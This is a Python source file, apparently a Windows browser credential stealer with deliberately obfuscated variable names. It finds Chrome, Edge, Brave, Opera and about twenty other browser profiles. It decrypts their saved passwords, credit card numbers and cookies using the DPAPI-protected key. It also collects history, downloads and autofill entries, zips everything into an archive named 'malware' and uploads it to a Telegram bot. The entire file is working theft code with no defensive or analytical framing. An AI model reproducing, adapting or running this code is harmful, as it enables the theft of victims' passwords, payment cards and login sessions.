import sys
import base64
import json
import os
import shutil
import sqlite3
import requests
from datetime import datetime, timedelta
import colorama
from colorama import Fore, Back, Style
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
colorama.init()

banner = f"""
{Fore.GREEN}                                           
         _ ___        _           _         
 ___ ___| |  _|   ___| |_ ___ ___| |___ ___ 
|_ -| -_| |  _|  |_ -|  _| -_| .'| | -_|  _|
|___|___|_|_|    |___|_| |___|__,|_|___|_|  
                                x_5corpion
{Style.RESET_ALL}
"""

print(banner)

vB8dQ = os.getenv('LOCALAPPDATA')
G4rT2 = os.getenv('APPDATA')
j5Q8s = {
    'avast': vB8dQ + '\\AVAST Software\\Browser\\User Data',
    'amigo': vB8dQ + '\\Amigo\\User Data',
    'torch': vB8dQ + '\\Torch\\User Data',
    'kometa': vB8dQ + '\\Kometa\\User Data',
    'orbitum': vB8dQ + '\\Orbitum\\User Data',
    'cent': vB8dQ + '\\CentBrowser\\User Data',
    '7star': vB8dQ + '\\7Star\\7Star\\User Data',
    'sputnik': vB8dQ + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': vB8dQ + '\\Vivaldi\\User Data',
    'chromium': vB8dQ + '\\Chromium\\User Data',
    'chrome-canary': vB8dQ + '\\Google\\Chrome SxS\\User Data',
    'chrome': vB8dQ + '\\Google\\Chrome\\User Data',
    'epic': vB8dQ + '\\Epic Privacy Browser\\User Data',
    'msedge': vB8dQ + '\\Microsoft\\Edge\\User Data',
    'msedge-canary': vB8dQ + '\\Microsoft\\Edge SxS\\User Data',
    'msedge-beta': vB8dQ + '\\Microsoft\\Edge Beta\\User Data',
    'msedge-dev': vB8dQ + '\\Microsoft\\Edge Dev\\User Data',
    'uran': vB8dQ + '\\uCozMedia\\Uran\\User Data',
    'yandex': vB8dQ + '\\Yandex\\YandexBrowser\\User Data',
    'brave': vB8dQ + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': vB8dQ + '\\Iridium\\User Data',
    'coccoc': vB8dQ + '\\CocCoc\\Browser\\User Data',
    'opera': G4rT2 + '\\Opera Software\\Opera Stable',
    'opera-gx': G4rT2 + '\\Opera Software\\Opera GX Stable'
}
c2L9e = {
    'login_data': {
        'qA7d8': 'SELECT action_url, username_value, password_value FROM logins',
        'rY6u5': '\\Login Data',
        'yR3d4': ['URL', 'Email', 'Password'],
        'decrypt': True
    },
    'credit_cards': {
        'qA7d8': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
        'rY6u5': '\\Web Data',
        'yR3d4': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
        'decrypt': True
    },
    'cookies': {
        'qA7d8': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
        'rY6u5': '\\Network\\Cookies',
        'yR3d4': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
        'decrypt': True
    },
    'history': {
        'qA7d8': 'SELECT url, title, last_visit_time, visit_count FROM urls',
        'rY6u5': '\\History',
        'yR3d4': ['URL', 'Title', 'Last Visit Time', 'Visit Count'],
        'decrypt': False
    },
    'downloads': {
        'qA7d8': 'SELECT target_path, tab_url, start_time, received_bytes FROM downloads',
        'rY6u5': '\\History',
        'yR3d4': ['Target Path', 'Tab URL', 'Start Time', 'Received Bytes'],
        'decrypt': False
    },
    'autofill': {
        'qA7d8': 'SELECT name, value FROM autofill',
        'rY6u5': '\\Web Data',
        'yR3d4': ['Name', 'Value'],
        'decrypt': False
    }
}
def iU9k1(p9X3c: str):
    if not os.path.exists(p9X3c):
        return
    if 'os_crypt' not in open(p9X3c + "\\Local State", 'r', encoding='utf-8').read():
        return
    with open(p9X3c + "\\Local State", "r", encoding="utf-8") as f:
        m5P1k = f.read()
    g6R2e = json.loads(m5P1k)
    d7J8q = base64.b64decode(g6R2e["os_crypt"]["encrypted_key"])
    d7J8q = d7J8q[5:]
    d7J8q = CryptUnprotectData(d7J8q, None, None, None, 0)[1]
    return d7J8q
def l6Q3v(c3Y2t: bytes, e1Z9w: bytes) -> str:
    k8J6z = c3Y2t[3:15]
    d5L7p = c3Y2t[15:]
    r4K5x = AES.new(e1Z9w, AES.MODE_GCM, k8J6z)
    v6F2n = r4K5x.decrypt(d5L7p)
    v6F2n = v6F2n[:-16].decode()
    return v6F2n
def f7S9x(b2D8k, m1U6t, n4F3r):
    v1C2j = os.path.join('_temp', b2D8k)
    if not os.path.exists(v1C2j):
        os.makedirs(v1C2j)
    if n4F3r:
        b3G5m = os.path.join(v1C2j, f'{m1U6t}.txt')
        with open(b3G5m, 'w', encoding='utf-8') as file:
            file.write(n4F3r)
def m5R1e(g4P7t):
    if g4P7t and g4P7t != 0:
        return (datetime(1601, 1, 1) + timedelta(microseconds=g4P7t)).strftime('%m/%d/%Y %H:%M:%S')
    return 'N/A'
def k7Q9w(b2X8l: str, x9Z4v: str, f8S1r, t2E6m):
    f1K5p = f'{b2X8l}\\{x9Z4v}{t2E6m["rY6u5"]}'
    if not os.path.exists(f1K5p):
        return
    w3T4h = ""
    try:
        shutil.copy(f1K5p, 'tmp_db')
    except:
        return w3T4h
    o9D2k = sqlite3.connect('tmp_db')
    q3L8d = o9D2k.cursor()
    q3L8d.execute(t2E6m['qA7d8'])
    for y2J5v in q3L8d.fetchall():
        y2J5v = list(y2J5v)
        if t2E6m['decrypt']:
            for i in range(len(y2J5v)):
                if isinstance(y2J5v[i], bytes) and y2J5v[i]:
                    y2J5v[i] = l6Q3v(y2J5v[i], f8S1r)
        if 'Last Visit Time' in t2E6m['yR3d4']:
            j8M4l = t2E6m['yR3d4'].index('Last Visit Time')
            y2J5v[j8M4l] = m5R1e(y2J5v[j8M4l])
        if 'Start Time' in t2E6m['yR3d4']:
            q5L2d = t2E6m['yR3d4'].index('Start Time')
            y2J5v[q5L2d] = m5R1e(y2J5v[q5L2d])
        w3T4h += "\n".join([f"{r5K1x}: {v4H8z}" for r5K1x, v4H8z in zip(t2E6m['yR3d4'], y2J5v)]) + "\n\n"
    o9D2k.close()
    os.remove('tmp_db')
    return w3T4h
def x7L2t():
    r2P5f = []
    for i7H8r in j5Q8s.keys():
        if os.path.exists(j5Q8s[i7H8r] + "\\Local State"):
            r2P5f.append(i7H8r)
    return r2P5f
def o2D3p(n6M5y, c2Y8j):
    shutil.make_archive(c2Y8j, 'zip', n6M5y)
def z9N5f(bot_tkn, chat_id, l8W1q):
    q4L9s = f"https://api.telegram.org/bot{bot_tkn}/sendDocument"
    with open(l8W1q, 'rb') as file:
        f5V3k = requests.post(q4L9s, data={"chat_id": chat_id}, files={"document": file})
    return f5V3k.json()
def dlt_fldr(w1C7z):
    if os.path.exists(w1C7z):
        shutil.rmtree(w1C7z)
if __name__ == '__main__':
    print("Your files will be sent to your telegram bot once you have entered correct inputs!")
    a2H3v = x7L2t()
    for b1K5l in a2H3v:
        b3H2d = j5Q8s[b1K5l]
        k9F3y = iU9k1(b3H2d)
        for s6J8p, t4F9d in c2L9e.items():
            e9B2x = ['opera-gx']
            v1G8h = "Default"
            if b1K5l in e9B2x:
                v1G8h = ""
            n4P7c = k7Q9w(b3H2d, v1G8h, k9F3y, t4F9d)
            f7S9x(b1K5l, s6J8p, n4P7c)
    p3X9w = "malware"
    o2D3p("_temp", p3X9w)
    bot_tkn = input("\nEnter your telegram bot token: ")
    chat_id = input("\nEnter your telegram chat Id;\nGet it using RawDatabot: ")
    z9N5f(bot_tkn, chat_id, f"{p3X9w}.zip")
    os.remove(f"{p3X9w}.zip")
    dlt_fldr('_temp')